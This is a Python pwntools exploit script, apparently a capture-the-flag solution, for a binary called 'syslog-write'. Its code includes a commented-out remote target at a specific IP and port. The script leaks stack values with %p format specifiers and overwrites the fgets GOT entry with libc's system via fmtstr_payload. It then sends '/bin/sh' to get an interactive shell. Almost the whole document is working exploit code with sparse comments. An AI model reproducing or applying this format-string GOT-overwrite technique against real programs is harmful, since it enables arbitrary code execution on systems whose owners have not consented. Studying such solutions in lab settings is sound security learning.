from pwn import *

context.arch = 'amd64'


p = process('./syslog-write')
# p = remote('34.159.182.195',31921)
e = context.binary = ELF('./syslog-write')
libc = e.libc
context.log_level = 'error'


def write_syslog(data):
	p.sendlineafter(':', b'1')
	p.sendlineafter(':', b'1')
	p.sendlineafter(':', data)

def read_syslog():
	p.sendlineafter(':', b'2')

'''
# let's find the libc address
for i in range(1, 101):
	payload = '%' + str(i) + '$p'
	payload = payload.encode()
	write_syslog(payload)
	read_syslog()	
	leak = p.recvuntil(b'==========').split(b'syslog-write: ')[-1].split(b'\n\n')[0]
	print(i, leak)
'''
''' Need ASLR OFF for this one since PIE is turned off'''


# local 94
# write_syslog(b'%94$p')
# read_syslog()
# libc_leak = p.recvuntil(b'==========').split(b'syslog-write: ')[-1].split(b'\n\n')[0]
# print(libc_leak)

# find libc address
libc.address = 0x00007ffff7dd6000


system = 0x000000000004c920
# print(system + libc.address)
# print(libc.symbols.system)
print(f"Base address: {e.address}")

# print(e.got['fgets'])


fgets = 0x0000000000404048
# found it through libc library database search on google



# print(fgets)
# print(libc.address + fgets)



payload = b''
payload += fmtstr_payload(7, {
    # e.got['fgets'] : libc.symbols.system
	# e.got['fgets'] : libc.address + system
	fgets : libc.address + system
})

write_syslog(payload)
p.sendlineafter(':', b'1')
p.sendlineafter(':', b'A'*0xa + b'/bin/sh\x00')

p.interactive()

